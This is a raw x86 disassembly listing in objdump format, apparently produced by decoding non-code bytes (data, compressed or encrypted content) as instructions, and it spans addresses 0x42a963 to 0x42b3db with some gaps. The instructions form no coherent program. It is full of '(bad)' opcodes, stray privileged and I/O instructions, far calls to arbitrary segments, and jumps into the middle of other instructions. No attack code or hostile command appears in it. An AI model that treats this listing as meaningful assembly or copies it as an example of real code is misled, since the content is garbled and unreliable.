  42a963:	or     esi,DWORD PTR [edi+0x3d]
  42a966:	cli    
  42a967:	jmp    WORD PTR [esi]
  42a96a:	inc    ecx
  42a96b:	mov    edx,0x8b1364f3
  42a970:	push   es
  42a971:	mov    eax,ds:0x5cf17adc
  42a976:	rol    BYTE PTR [ebp-0x4ebf0a23],0x7e
  42a97d:	push   ss
  42a97e:	jbe    0x42a9f0
  42a980:	cwde   
  42a981:	jl     0x42a9ef
  42a983:	scas   al,BYTE PTR es:[edi]
  42a984:	or     eax,0xc7567899
  42a989:	mov    ah,BYTE PTR [ecx+0x50]
  42a98c:	jmp    0x42aa0d
  42a98e:	push   edi
  42a98f:	sbb    dl,BYTE PTR [edi-0x28d72e35]
  42a995:	xchg   edx,eax
  42a996:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a997:	sbb    ecx,DWORD PTR [ecx+0x1c]
  42a99a:	jo     0x42a937
  42a99c:	int3   
  42a99d:	enter  0xa73c,0x9b
  42a9a1:	jno    0x42a971
  42a9a3:	outs   dx,BYTE PTR ds:[esi]
  42a9a4:	jmp    0x42a961
  42a9a6:	arpl   WORD PTR [ebx-0x10b2bb9f],cx
  42a9ac:	inc    ecx
  42a9ad:	xchg   esp,eax
  42a9ae:	sahf   
  42a9af:	jno    0x42aa07
  42a9b1:	push   cs
  42a9b2:	xor    DWORD PTR [edx-0x7b],esi
  42a9b5:	int    0xab
  42a9b7:	push   ecx
  42a9b8:	or     ebp,DWORD PTR [eax+eiz*1+0x3ed657aa]
  42a9bf:	fsubr  DWORD PTR [ebx+0xd]
	...
  42aa31:	add    BYTE PTR [eax],al
  42aa33:	add    dh,cl
  42aa35:	std    
  42aa36:	sti    
  42aa37:	leave  
  42aa38:	sti    
  42aa39:	iret   
  42aa3a:	(bad)  
  42aa3b:	(bad)  
  42aa3c:	jmp    FWORD PTR [edi+ebx*1-0x1c]
  42aa40:	jmp    0x7d2d8784
  42aa45:	les    eax,FWORD PTR [ecx]
  42aa47:	add    dh,dh
  42aa49:	add    BYTE PTR [eax],al
  42aa4b:	add    BYTE PTR [edi],bl
  42aa4d:	nop
  42aa4e:	ss int3 
  42aa50:	ins    BYTE PTR es:[edi],dx
  42aa51:	inc    ebp
  42aa52:	or     BYTE PTR [esi-0x6b],cl
  42aa55:	fsubr  DWORD PTR [ebx-0x2c8551b]
  42aa5b:	sahf   
  42aa5c:	add    DWORD PTR [eax-0x1b9937f],esi
  42aa62:	nop
  42aa63:	mov    bh,0x15
  42aa65:	cmp    ecx,DWORD PTR [ebp-0x7b90462f]
  42aa6b:	cmp    ecx,DWORD PTR [ecx-0x723979b9]
  42aa71:	mov    dl,0xef
  42aa73:	std    
  42aa74:	xlat   BYTE PTR ds:[ebx]
  42aa75:	jae    0x42aa4e
  42aa77:	push   edx
  42aa78:	jmp    0x27b9b347
  42aa7d:	dec    eax
  42aa7e:	fdivr  QWORD PTR [ecx]
  42aa80:	sub    eax,0x24fea8f1
  42aa85:	mov    ds:0x7b036eb6,eax
  42aa8a:	mov    ds:0x4dc11455,eax
  42aa8f:	call   0x1517:0xf2a86e26
  42aa96:	mov    ds:0xf8dbb690,eax
  42aa9b:	bound  edi,QWORD PTR [eax]
  42aa9d:	jnp    0x42aa1f
  42aa9f:	pop    ss
  42aaa0:	fsub   DWORD PTR [esi+ebp*4-0x57]
  42aaa4:	(bad)  
  42aaa6:	daa    
  42aaa7:	mov    ah,0xbf
  42aaa9:	hlt    
  42aaaa:	push   edx
  42aaab:	adc    ch,BYTE PTR [ecx+0x33]
  42aaae:	xchg   dl,ch
  42aab0:	sub    BYTE PTR [ebp+0x45],al
  42aab3:	inc    esp
  42aab4:	arpl   WORD PTR [ebx+ecx*2+0x72],cx
  42aab8:	out    0xc7,eax
  42aaba:	sbb    bh,BYTE PTR [edx+0x79]
  42aabd:	in     eax,dx
  42aabe:	and    eax,eax
  42aac0:	aas    
  42aac1:	mov    esp,0xa1e6e0e4
  42aac6:	shl    DWORD PTR ds:0xa0569423,cl
  42aacc:	dec    edi
  42aacd:	shr    DWORD PTR [edi-0x17],1
  42aad0:	sub    DWORD PTR ds:0x3633b6d6,ecx
  42aad6:	inc    eax
  42aad7:	push   esi
  42aad8:	das    
  42aad9:	xchg   di,ax
  42aadb:	mov    ?,ebp
  42aadd:	dec    ebx
  42aade:	stos   DWORD PTR es:[edi],eax
  42aadf:	add    eax,0xd96ad0e2
  42aae4:	ftst   
  42aae6:	mov    DWORD PTR [eax+0x5895047b],0x86651ec0
  42aaf0:	sbb    bh,ch
  42aaf2:	sub    DWORD PTR [ebx+ebp*1-0x5c],ebx
  42aaf6:	retfw  
  42aaf8:	push   es
  42aaf9:	popf   
  42aafa:	inc    ecx
  42aafb:	mov    al,0x6f
  42aafd:	jmp    0x42aaf8
  42aaff:	xchg   edx,eax
  42ab00:	mov    bl,0xe5
  42ab02:	aas    
  42ab03:	loope  0x42aab4
  42ab05:	xor    BYTE PTR [edx-0x1e3bad5],ah
  42ab0b:	(bad)  
  42ab0d:	and    dl,ch
  42ab0f:	rcl    dh,1
  42ab11:	neg    DWORD PTR [esi]
  42ab13:	(bad)  
  42ab15:	clc    
  42ab16:	lahf   
  42ab17:	or     DWORD PTR [edx],edx
  42ab19:	or     DWORD PTR [edi],edi
  42ab1b:	(bad)  
  42ab1c:	mov    ebp,0x9dd298bf
  42ab21:	and    ecx,DWORD PTR ds:0x69c84f82
  42ab27:	jne    0x42aacc
  42ab29:	dec    edi
  42ab2a:	lock jnp 0x42ab09
  42ab2d:	xlat   BYTE PTR ds:[ebx]
  42ab2e:	sbb    ecx,esi
  42ab30:	pop    ss
  42ab31:	dec    ebx
  42ab32:	pop    ss
  42ab33:	pop    eax
  42ab34:	mov    dh,0x96
  42ab36:	sub    esi,DWORD PTR [ebx]
  42ab38:	int    0xb1
  42ab3a:	mov    ebp,0xdec14c85
  42ab3f:	mov    al,0x66
  42ab41:	cli    
	...
  42abb2:	add    BYTE PTR [eax],al
  42abb4:	mov    ds:0xb788a616,eax
  42abb9:	mov    eax,0x50433faf
  42abbe:	es inc esp
  42abc0:	scas   eax,DWORD PTR es:[edi]
  42abc1:	or     ah,BYTE PTR [esi-0x73]
  42abc4:	jb     0x42ab8b
  42abc6:	add    DWORD PTR [eax],eax
  42abc8:	test   BYTE PTR [eax],0x0
  42abcb:	add    BYTE PTR [ebp+0x515d8b6e],bh
  42abd1:	sub    ah,BYTE PTR [ebx-0x50]
  42abd4:	mov    dh,0xe4
  42abd6:	push   0x7b
  42abd8:	popf   
  42abd9:	gs sub al,0xd7
  42abdc:	xor    al,0x69
  42abde:	rcl    al,1
  42abe0:	aaa    
  42abe1:	pushf  
  42abe2:	xchg   ebp,eax
  42abe3:	popf   
  42abe4:	jle    0x42abb5
  42abe6:	mov    ds:0x5cca6d20,al
  42abeb:	mov    ch,0xd7
  42abed:	add    DWORD PTR [edi-0x4e39f1c7],ecx
  42abf3:	sti    
  42abf4:	fiadd  WORD PTR [edi]
  42abf6:	(bad)  [ebx]
  42abf8:	jne    0x42ac10
  42abfa:	mov    ?,edx
  42abfc:	shr    BYTE PTR [ebx],0x80
  42abff:	sub    DWORD PTR [ebp+0x5189d8bc],edx
  42ac05:	xor    al,0x25
  42ac07:	fcos   
  42ac09:	(bad)  
  42ac0a:	xchg   ebp,eax
  42ac0b:	xchg   ebx,eax
  42ac0c:	and    DWORD PTR [edi+0x4c4a934c],edi
  42ac12:	dec    ebp
  42ac13:	lods   eax,DWORD PTR ds:[esi]
  42ac14:	mov    ebp,0xd8b7b389
  42ac19:	cmp    al,BYTE PTR [edx-0x10b630c7]
  42ac1f:	add    eax,ebp
  42ac21:	pop    edi
  42ac22:	ss sbb al,cl
  42ac25:	enter  0x9a04,0xa9
  42ac29:	xor    al,BYTE PTR [ebx]
  42ac2b:	cmp    cl,bl
  42ac2d:	imul   edx,DWORD PTR fs:[ebx+0x6b],0x4c6b0dd9
  42ac35:	out    0xb1,eax
  42ac37:	dec    ebx
  42ac38:	and    BYTE PTR [edi+0x39],dl
  42ac3b:	icebp  
  42ac3c:	test   eax,0x5180518e
  42ac41:	pop    ebp
  42ac42:	cld    
  42ac43:	sub    ebp,DWORD PTR [edi-0x6b]
  42ac46:	inc    edi
  42ac47:	xor    dl,dl
  42ac49:	arpl   cx,cx
  42ac4b:	jmp    0xc3da0a24
  42ac50:	aaa    
  42ac51:	test   DWORD PTR [esi-0x3],ecx
  42ac54:	int3   
  42ac55:	xor    edx,DWORD PTR [eax+0x30876984]
  42ac5b:	sti    
  42ac5c:	xchg   esp,eax
  42ac5d:	dec    esi
  42ac5e:	call   0xc07d:0x80ac432a
  42ac65:	pop    edi
  42ac66:	ja     0x42ac8e
  42ac68:	cli    
  42ac69:	xor    DWORD PTR [ecx],eax
  42ac6b:	test   al,0x22
  42ac6d:	jae    0x42ac28
  42ac6f:	ret    
  42ac70:	adc    cl,BYTE PTR [edi]
  42ac72:	(bad)  
  42ac73:	and    cl,al
  42ac75:	es cmp al,0xd2
  42ac78:	pop    esp
  42ac79:	push   es
  42ac7a:	dec    ebx
  42ac7b:	repnz pop esp
  42ac7d:	push   es
  42ac7e:	repz mul BYTE PTR [ebx]
  42ac81:	xor    eax,0x7332848e
  42ac86:	ss retf 0x946c
  42ac8a:	das    
  42ac8b:	lahf   
  42ac8c:	mov    edi,0x355d455c
  42ac91:	div    esp
  42ac93:	mov    al,ds:0x94456576
  42ac98:	mov    ch,0x66
  42ac9a:	mov    DWORD PTR [ebp+0x4961ccc8],esi
  42aca0:	jb     0x42ac33
  42aca2:	pop    ebp
  42aca3:	push   DWORD PTR [edx]
  42aca5:	out    0x2c,al
  42aca7:	mov    ebp,0x16331f27
  42acac:	jge    0x42aca3
  42acae:	leave  
  42acaf:	shl    DWORD PTR [ebp+edx*8+0x33],0x27
  42acb4:	xor    bh,BYTE PTR [edi+ecx*1+0x29d8b13b]
  42acbb:	xchg   esp,eax
  42acbc:	sub    ebx,DWORD PTR [eax+0x6ba72f75]
	...
  42ad32:	add    BYTE PTR [eax],al
  42ad34:	fwait
  42ad35:	mov    bh,0xc4
  42ad37:	or     al,0xec
  42ad39:	jg     0x42ad16
  42ad3b:	mov    bh,0xb7
  42ad3d:	sub    DWORD PTR [eax],ebx
  42ad3f:	btc    DWORD PTR [ecx+0x7c],edi
  42ad43:	xor    al,0x68
  42ad45:	mov    BYTE PTR [ecx],0x0
  42ad48:	test   BYTE PTR [eax],0x0
  42ad4b:	add    al,ch
  42ad4d:	clc    
  42ad4e:	pop    ebx
  42ad4f:	push   ds
  42ad50:	jg     0x42ad8a
  42ad52:	sub    ebx,esi
  42ad54:	push   ebx
  42ad55:	(bad)  
  42ad56:	ja     0x42adcd
  42ad58:	popa   
  42ad59:	js     0x42ad45
  42ad5b:	cdq    
  42ad5c:	test   DWORD PTR [edx+eiz*4],ecx
  42ad5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad60:	loop   0x42ad8e
  42ad62:	jg     0x42ad30
  42ad64:	mov    ds:0x7e0943c9,eax
  42ad69:	xchg   edi,eax
  42ad6a:	dec    eax
  42ad6b:	loopne 0x42ad75
  42ad6d:	test   ch,0x17
  42ad70:	mov    edx,?
  42ad72:	(bad)  
  42ad74:	sub    DWORD PTR [edi+0x15],0x14
  42ad78:	pop    esi
  42ad79:	and    al,0xe
  42ad7b:	push   dx
  42ad7d:	or     edi,eax
  42ad7f:	xchg   ebp,eax
  42ad80:	xor    eax,DWORD PTR [ebp-0x62]
  42ad83:	idiv   ah
  42ad85:	fnstcw WORD PTR [edx+0x78]
  42ad88:	cmc    
  42ad89:	xchg   ecx,eax
  42ad8a:	xor    eax,0xa441d98a
  42ad8f:	sbb    DWORD PTR [eax-0x50fe6121],ebx
  42ad95:	adc    ebx,DWORD PTR [esi]
  42ad97:	adc    eax,0x9dfafe4a
  42ad9c:	dec    ebx
  42ad9d:	dec    edx
  42ad9e:	lahf   
  42ad9f:	test   al,0x40
  42ada1:	cwde   
  42ada2:	mov    ebx,0xa08a8950
  42ada7:	xchg   ebx,eax
  42ada8:	push   ss
  42ada9:	outs   dx,BYTE PTR ds:[esi]
  42adaa:	div    DWORD PTR [edx-0x7474164e]
  42adb0:	push   ss
  42adb1:	sbb    DWORD PTR [ebp+ebp*1-0x11],edx
  42adb5:	fs cmp eax,0x12dda956
  42adbb:	es sbb esp,ebp
  42adbe:	js     0x42ae15
  42adc0:	pop    eax
  42adc1:	pop    esi
  42adc2:	or     eax,0xba806472
  42adc7:	pop    ss
  42adc8:	dec    esi
  42adc9:	mov    dl,0x67
  42adcb:	into   
  42adcc:	adc    cl,ah
  42adce:	aad    0xed
  42add0:	and    BYTE PTR [esi+0x39cbedb5],cl
  42add6:	test   bl,0xbd
  42add9:	sahf   
  42adda:	fnstenv [eax]
  42addc:	cmp    BYTE PTR [edi+0x658b8986],bh
  42ade2:	test   al,0x56
  42ade4:	outs   dx,DWORD PTR ds:[esi]
  42ade5:	and    cl,BYTE PTR [ebx+0x79755cdb]
  42adeb:	clc    
  42adec:	mov    dh,0x23
  42adee:	leave  
  42adef:	test   al,0xb0
  42adf1:	inc    edx
  42adf2:	pop    ebp
  42adf3:	sub    DWORD PTR [ebx+0x9664fc0],0x4157475b
  42adfd:	adc    al,0x2a
  42adff:	pop    es
  42ae00:	mov    bh,BYTE PTR [ecx-0x3fdfab92]
  42ae06:	mov    ebx,0xb222c6aa
  42ae0b:	sub    eax,0xa142f7ed
  42ae10:	mov    esp,edi
  42ae12:	mov    edi,0xe8f575f6
  42ae17:	and    al,0xd2
  42ae19:	dec    esi
  42ae1a:	mov    WORD PTR [eax-0x3685b6bc],gs
  42ae20:	bound  esp,QWORD PTR [edx+esi*4]
  42ae23:	jno    0x42ae2f
  42ae25:	sar    BYTE PTR [esi+0x63],0x9b
  42ae29:	or     ebx,ebx
  42ae2b:	(bad)  
  42ae2c:	push   ecx
  42ae2d:	shr    BYTE PTR [edi+0x63752d5],0xef
  42ae34:	ds adc eax,0x2ff535f9
  42ae3a:	xchg   edx,eax
  42ae3b:	or     eax,0x381787ce
  42ae40:	fsubr  QWORD PTR [ebx]
	...
  42aeb2:	add    BYTE PTR [eax],al
  42aeb4:	xor    DWORD PTR [ebp-0x38],eax
  42aeb7:	push   es
  42aeb8:	cld    
  42aeb9:	(bad)  
  42aeba:	push   DWORD PTR [edi+0x59]
  42aebd:	out    dx,eax
  42aebe:	adc    dl,al
  42aec0:	push   ss
  42aec1:	mov    dl,0x7
  42aec3:	imul   ebx,DWORD PTR [esi-0x39],0xf60001
  42aeca:	add    BYTE PTR [eax],al
  42aecc:	ret    0x505b
  42aecf:	adc    esi,DWORD PTR ds:0x39ad3a34
  42aed5:	jno    0x42aeeb
  42aed7:	sbb    eax,0x5ec7f90a
  42aedc:	push   es
  42aedd:	adc    edx,esp
  42aedf:	jg     0x42af38
  42aee1:	inc    esp
  42aee2:	repz arpl bx,ax
  42aee5:	mov    ch,0x4b
  42aee7:	inc    esi
  42aee8:	xchg   edx,eax
  42aee9:	stc    
  42aeea:	push   ds
  42aeeb:	inc    BYTE PTR ds:0x20608469
  42aef1:	xchg   DWORD PTR [ebx],ecx
  42aef3:	setb   BYTE PTR ds:0xb903e70
  42aefa:	adc    al,0x4
  42aefc:	dec    esi
  42aefd:	add    al,0x3a
  42aeff:	dec    eax
  42af00:	mov    dh,0x58
  42af02:	mov    ah,BYTE PTR [edi+0x70]
  42af05:	mov    bl,0xfd
  42af07:	xlat   BYTE PTR ds:[ebx]
  42af08:	popf   
  42af09:	adc    al,0x52
  42af0b:	rcl    dl,0x12
  42af0e:	push   ds
  42af0f:	sbb    bl,BYTE PTR [edx+esi*8-0x3c]
  42af13:	pop    es
  42af14:	test   BYTE PTR [eax],bl
  42af16:	js     0x42af67
  42af18:	pusha  
  42af19:	aam    0x93
  42af1b:	fst    QWORD PTR [ebp+0x1b2ecf69]
  42af21:	and    BYTE PTR [ebp-0x308366bd],bh
  42af27:	cwde   
  42af28:	popf   
  42af29:	inc    esp
  42af2a:	sbb    DWORD PTR gs:[ecx+0x1e309c6f],ecx
  42af31:	ins    DWORD PTR es:[edi],dx
  42af32:	xor    BYTE PTR [ecx-0x54599e93],ah
  42af38:	cwde   
  42af39:	mov    dh,0x24
  42af3b:	test   al,0xa8
  42af3d:	ds test al,0xb2
  42af40:	mov    dl,0x66
  42af42:	jp     0x42af82
  42af44:	aas    
  42af45:	mov    ?,WORD PTR [eax+0x203d8c3f]
  42af4b:	ret    0x9413
  42af4e:	mov    esi,0xda604ea6
  42af53:	push   ds
  42af54:	fcmovnb st,st(4)
  42af56:	adc    bh,BYTE PTR [edi+ecx*4+0x4dfe9787]
  42af5d:	repnz xor eax,DWORD PTR [eax-0x7520e755]
  42af64:	mov    al,ds:0x38e7a4c5
  42af6a:	or     BYTE PTR [edx-0x46],dl
  42af6d:	push   ebp
  42af6e:	rcl    DWORD PTR [edi+eiz*8-0x7a],0xa0
  42af73:	inc    ecx
  42af74:	dec    edx
  42af75:	jne    0x42af32
  42af77:	and    dh,BYTE PTR [eax]
  42af79:	fsubr  DWORD PTR [ecx+0x6e5eb69e]
  42af7f:	data16 sbb al,0x80
  42af82:	jbe    0x42af23
  42af84:	iret   
  42af85:	mov    ebx,0xddb233b4
  42af8a:	mov    ds:0xcf3ad47c,al
  42af8f:	inc    ecx
  42af90:	enter  0xf742,0xce
  42af94:	pop    ds
  42af95:	outs   dx,DWORD PTR ds:[esi]
  42af96:	and    eax,0x1be47502
  42af9b:	jge    0x42b002
  42af9d:	loop   0x42afdf
  42af9f:	xor    ebx,DWORD PTR [esi]
  42afa1:	les    ebp,FWORD PTR [edx]
  42afa3:	das    
  42afa4:	adc    bl,0x52
  42afa7:	jns    0x42af5f
  42afa9:	and    ecx,0xce10d559
  42afaf:	popa   
  42afb0:	loopne 0x42afac
  42afb2:	jnp    0x42af9f
  42afb4:	xchg   esi,eax
  42afb5:	outs   dx,DWORD PTR ds:[esi]
  42afb6:	cmp    al,0xd1
  42afb8:	popf   
  42afb9:	cmp    dl,BYTE PTR [edx-0xc139a70]
  42afbf:	add    eax,0x1da5
	...
  42b034:	xlat   BYTE PTR ds:[ebx]
  42b035:	pushf  
  42b036:	shr    BYTE PTR [ebp-0x1000235],0x4c
  42b03d:	jb     0x42b001
  42b03f:	ret    0xcf42
  42b042:	mov    ds:0x1c85448,eax
  42b047:	add    dh,dh
  42b049:	add    BYTE PTR [eax],al
  42b04b:	add    BYTE PTR [ecx+0x6ca53627],al
  42b051:	ins    BYTE PTR es:[edi],dx
  42b052:	bound  ebx,QWORD PTR [ecx+0x17]
  42b055:	or     eax,0x8e20f83c
  42b05a:	cs jp  0x42b0b6
  42b05d:	es jne 0x42b038
  42b060:	lods   eax,DWORD PTR ds:[esi]
  42b061:	sub    DWORD PTR [eax],esp
  42b063:	or     DWORD PTR [edi-0x3d6e6eb9],0xffffff85
  42b06a:	push   edi
  42b06b:	push   ss
  42b06c:	add    al,0xcb
  42b06e:	not    DWORD PTR [edi-0x14cc0369]
  42b074:	hlt    
  42b075:	sbb    BYTE PTR [ebx+0x39],bh
  42b078:	fst    DWORD PTR [ebx-0x756e8ddb]
  42b07e:	fs das 
  42b080:	fstp   QWORD PTR [eax]
  42b082:	push   0xd5293086
  42b087:	inc    esi
  42b088:	imul   DWORD PTR [ebp-0x2a92a375]
  42b08e:	mov    eax,edx
  42b090:	and    ch,BYTE PTR [ebx-0x14]
  42b093:	push   ss
  42b094:	mov    eax,ds:0x73531288
  42b099:	dec    edx
  42b09a:	add    BYTE PTR [esi+ecx*1-0x1f8d7f44],bh
  42b0a1:	addr16 test eax,0xe7550ea
  42b0a7:	and    edi,edx
  42b0a9:	inc    eax
  42b0aa:	push   esp
  42b0ab:	xlat   BYTE PTR ds:[ebx]
  42b0ac:	xchg   dl,bh
  42b0ae:	pop    edi
  42b0af:	mov    ch,0x89
  42b0b1:	arpl   WORD PTR [ebx-0x6b55c006],di
  42b0b7:	rol    ebx,cl
  42b0b9:	mov    ebp,esi
  42b0bb:	pop    ss
  42b0bc:	lds    esp,FWORD PTR [eax+ebp*4]
  42b0bf:	fs mov edi,ecx
  42b0c2:	pop    esp
  42b0c3:	mov    ebp,0x8e971cdc
  42b0c8:	pop    edi
  42b0c9:	in     al,dx
  42b0ca:	jns    0x42b072
  42b0cc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b0cd:	cli    
  42b0ce:	inc    esp
  42b0cf:	xchg   esp,eax
  42b0d0:	cwde   
  42b0d1:	xor    ecx,esp
  42b0d3:	inc    esp
  42b0d4:	adc    BYTE PTR [ebp+0x3c4e231e],dl
  42b0da:	test   DWORD PTR [esi+0x42],esi
  42b0dd:	(bad)  
  42b0de:	daa    
  42b0df:	jl     0x42b0bd
  42b0e1:	inc    edi
  42b0e2:	and    al,0xec
  42b0e4:	data16 daa 
  42b0e6:	and    al,BYTE PTR [esi]
  42b0e8:	jge    0x42b143
  42b0ea:	jnp    0x42b15e
  42b0ec:	xchg   ebp,eax
  42b0ed:	sbb    esp,edx
  42b0ef:	lods   eax,DWORD PTR ds:[esi]
  42b0f0:	rol    DWORD PTR ds:0x40fa9318,1
  42b0f6:	in     al,0x85
  42b0f8:	int3   
  42b0f9:	mov    al,0x77
  42b0fb:	call   0x4fe3c78
  42b100:	mov    edx,0x78cb4a87
  42b105:	sbb    DWORD PTR [edx-0x5ec11f34],eax
  42b10b:	loop   0x42b122
  42b10d:	bnd jno 0x42b095
  42b110:	pushf  
  42b111:	mov    eax,ds:0x4d1b87c0
  42b116:	add    ebx,edi
  42b118:	pop    edi
  42b119:	jnp    0x42b196
  42b11b:	int    0x8
  42b11d:	lea    edx,[ecx+0x13]
  42b120:	add    ebp,edx
  42b122:	sub    bl,0x6d
  42b125:	stos   DWORD PTR es:[edi],eax
  42b126:	jle    0x42b13f
  42b128:	int3   
  42b129:	push   esp
  42b12a:	xchg   edi,eax
  42b12b:	mov    ch,0xd5
  42b12d:	xchg   esi,eax
  42b12e:	and    DWORD PTR fs:[edx-0x67],ecx
  42b132:	dec    ebx
  42b133:	in     al,dx
  42b134:	cmc    
  42b135:	imul   eax,ecx,0xffffffb0
  42b138:	pop    esi
  42b139:	mov    ah,dl
  42b13b:	pop    ebp
  42b13c:	cmp    DWORD PTR [edx-0x69695498],edx
	...
  42b1b2:	add    BYTE PTR [eax],al
  42b1b4:	sub    eax,DWORD PTR [ebp+0x19bf1995]
  42b1ba:	scas   eax,DWORD PTR es:[edi]
  42b1bb:	mov    bh,0x27
  42b1bd:	xchg   ecx,eax
  42b1be:	push   esp
  42b1bf:	outs   dx,DWORD PTR ds:[esi]
  42b1c0:	mov    eax,ds:0x4a8561aa
  42b1c5:	leave  
  42b1c6:	add    DWORD PTR [eax],eax
  42b1c8:	test   BYTE PTR [eax],0x0
  42b1cb:	add    BYTE PTR [esi],bl
  42b1cd:	jl     0x42b1c3
  42b1cf:	sbb    BYTE PTR [ebp-0x5],dl
  42b1d2:	jmp    0x42b1fb
  42b1d4:	popa   
  42b1d5:	cwde   
  42b1d6:	jns    0x42b1e1
  42b1d8:	jge    0x42b23f
  42b1da:	fdiv   QWORD PTR [ecx+0x3c]
  42b1dd:	jmp    0x42b171
  42b1df:	mov    edx,0x89838989
  42b1e4:	clc    
  42b1e5:	mov    bl,0x1
  42b1e7:	sub    BYTE PTR [ebx+0x9],dl
  42b1ea:	and    ch,BYTE PTR [ebx-0x18a172d6]
  42b1f0:	imul   esp,DWORD PTR ds:0x1affc5d8,0x3748a186
  42b1fa:	dec    edi
  42b1fb:	xor    esp,DWORD PTR [eax-0x59865e28]
  42b201:	(bad)  
  42b202:	stc    
  42b203:	aad    0x5c
  42b205:	test   eax,0x28ec817b
  42b20a:	inc    ecx
  42b20b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b20c:	sbb    ecx,DWORD PTR [ecx-0x4f5498b7]
  42b212:	mov    ebx,DWORD PTR [edx+0x63ee8de4]
  42b218:	stos   DWORD PTR es:[edi],eax
  42b219:	lea    edi,[eax-0x23538a1f]
  42b21f:	pop    es
  42b220:	and    bl,BYTE PTR [edi-0x3da824c6]
  42b226:	aaa    
  42b227:	dec    ebp
  42b228:	or     DWORD PTR [esp+edi*1-0x5f2a7810],esp
  42b22f:	and    ah,cl
  42b231:	inc    ebp
  42b232:	inc    esp
  42b233:	retf   0x5b2
  42b236:	out    0xd,eax
  42b238:	jmp    0x42b255
  42b23a:	popa   
  42b23b:	lahf   
  42b23c:	jbe    0x42b1e8
  42b23e:	dec    ecx
  42b23f:	jp     0x42b2af
  42b241:	or     edi,DWORD PTR fs:[edx-0x2dab1826]
  42b248:	loopne 0x42b294
  42b24a:	cmp    dl,BYTE PTR [esi]
  42b24c:	lods   al,BYTE PTR ds:[esi]
  42b24d:	push   ebp
  42b24e:	cld    
  42b24f:	js     0x42b291
  42b251:	xchg   BYTE PTR [ebx+ebx*8],al
  42b254:	pop    ecx
  42b255:	adc    BYTE PTR [edi],ah
  42b257:	cmp    bh,BYTE PTR [esi]
  42b259:	mov    BYTE PTR [edi+ecx*2],bl
  42b25c:	adc    DWORD PTR [ebx+0x8a87d20],edx
  42b262:	or     esi,DWORD PTR [esi+0x461b7f4b]
  42b268:	cmc    
  42b269:	fs jp  0x42b281
  42b26c:	sbb    al,0x21
  42b26e:	sbb    cl,BYTE PTR [eax+0x741650]
  42b274:	int    0xae
  42b276:	pop    ds
  42b277:	pop    ds
  42b278:	stos   DWORD PTR es:[edi],eax
  42b279:	fwait
  42b27a:	loope  0x42b2c9
  42b27c:	jns    0x42b2ef
  42b27e:	cli    
  42b27f:	sub    al,0x14
  42b281:	into   
  42b282:	and    cl,BYTE PTR [edx+0x15]
  42b285:	xlat   BYTE PTR ds:[ebx]
  42b286:	fild   WORD PTR [esi-0x65]
  42b289:	push   edi
  42b28a:	mov    al,0xde
  42b28c:	nop
  42b28d:	fsub   st(0),st
  42b28f:	push   ss
  42b290:	inc    edx
  42b291:	fcmove st,st(1)
  42b293:	retf   
  42b294:	ins    BYTE PTR es:[edi],dx
  42b295:	xor    DWORD PTR [ecx+eiz*8],ebx
  42b298:	adc    al,0x36
  42b29a:	stc    
  42b29b:	std    
  42b29c:	sub    DWORD PTR [esp+eax*8+0x226bf689],ebx
  42b2a3:	js     0x42b24d
  42b2a5:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42b2a7:	fdiv   QWORD PTR [ebp+0x51e9b526]
  42b2ad:	xor    al,0x65
  42b2af:	lahf   
  42b2b0:	scas   eax,DWORD PTR es:[edi]
  42b2b1:	push   cs
  42b2b2:	cmp    DWORD PTR [esp+ebp*4+0x7c],edx
  42b2b6:	sbb    eax,0x8d4683e3
  42b2bb:	xchg   ebx,eax
  42b2bc:	mov    esp,0x4776b9d7
  42b2c1:	cmp    al,0x0
	...
  42b333:	add    BYTE PTR [edi+0xe],bh
  42b336:	jne    0x42b373
  42b338:	jne    0x42b3b5
  42b33a:	jg     0x42b38a
  42b33c:	out    0x79,eax
  42b33e:	and    DWORD PTR [eax-0x6a],esi
  42b341:	add    ebx,DWORD PTR [esi-0x80]
  42b344:	inc    eax
  42b345:	retf   0x1
  42b348:	test   BYTE PTR [eax],0x0
  42b34b:	add    BYTE PTR [ebx+ebp*1],bl
  42b34e:	lahf   
  42b34f:	das    
  42b350:	adc    eax,0x5086a1e1
  42b355:	or     DWORD PTR [edi-0x13873727],edi
  42b35b:	sbb    ebp,eax
  42b35d:	ins    BYTE PTR es:[edi],dx
  42b35e:	sbb    al,dl
  42b360:	ins    BYTE PTR es:[edi],dx
  42b361:	dec    ecx
  42b362:	inc    ebx
  42b363:	stos   BYTE PTR es:[edi],al
  42b364:	sbb    edx,eax
  42b366:	add    DWORD PTR [ebx],ebx
  42b368:	mov    eax,DWORD PTR [ecx]
  42b36a:	inc    eax
  42b36b:	jnp    0x42b2f3
  42b36d:	js     0x42b34f
  42b36f:	cmc    
  42b370:	pcmpeqw mm5,QWORD PTR [edi]
  42b373:	imul   ebx,esi,0xffffffc3
  42b376:	mov    dl,0x8a
  42b378:	lock xor BYTE PTR [esi],ch
  42b37b:	xchg   ecx,eax
  42b37c:	jo     0x42b378
  42b37e:	mov    ds:0xe56175c9,eax
  42b383:	fld    DWORD PTR [edi]
  42b385:	les    esp,FWORD PTR [ebx-0x54]
  42b388:	jecxz  0x42b3e8
  42b38a:	dec    edx
  42b38b:	xchg   edx,eax
  42b38c:	cmp    ebp,DWORD PTR [ebp-0x1a197031]
  42b392:	in     al,dx
  42b393:	ins    DWORD PTR es:[edi],dx
  42b394:	and    ecx,DWORD PTR [ecx]
  42b396:	mov    eax,ds:0xe16750bc
  42b39b:	data16 (bad) 
  42b39d:	stos   BYTE PTR es:[edi],al
  42b39e:	fild   WORD PTR ds:0x89e8c29
  42b3a4:	cli    
  42b3a5:	shl    ah,cl
  42b3a7:	push   ds
  42b3a8:	imul   eax,DWORD PTR [ecx-0x7f8ec137],0x35
  42b3af:	push   ecx
  42b3b0:	repnz add edx,DWORD PTR [edi+0xed51a57]
  42b3b7:	push   ss
  42b3b8:	inc    edx
  42b3b9:	or     DWORD PTR [ebx-0x5ca2b008],0x257cb4a4
  42b3c3:	dec    esi
  42b3c4:	repz mov edi,0x862329f3
  42b3ca:	inc    eax
  42b3cb:	mov    bh,0x23
  42b3cd:	sub    al,BYTE PTR [esp+edx*1+0xbf32a79]
  42b3d4:	(bad)  
  42b3d5:	sbb    al,0x3c
  42b3d7:	xchg   ebx,eax
  42b3d8:	cmp    ah,ah
  42b3da:	outs   dx,BYTE PTR ds:[esi]
  42b3db:	outs   dx,DWORD PTR ds:[esi]
